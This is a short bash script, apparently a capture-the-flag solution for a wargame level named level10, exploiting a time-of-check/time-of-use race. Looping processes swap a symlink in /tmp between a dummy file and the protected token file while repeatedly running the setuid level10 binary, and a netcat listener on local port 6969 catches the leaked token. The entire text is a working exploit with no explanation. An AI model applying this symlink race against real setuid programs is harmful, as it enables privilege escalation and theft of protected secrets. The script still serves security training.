#!/bin/bash

FILE=/tmp/phantom
LINK=/tmp/link
EXEC=/home/user/level10/level10
TOKEN=/home/user/level10/token

touch $FILE

while true
do
	$EXEC $LINK 127.0.0.1 &> /dev/null
done &

while true
do
	ln -fs $TOKEN $LINK
	ln -fs $FILE $LINK
done &

while true
do
	nc -lk 6969 
done
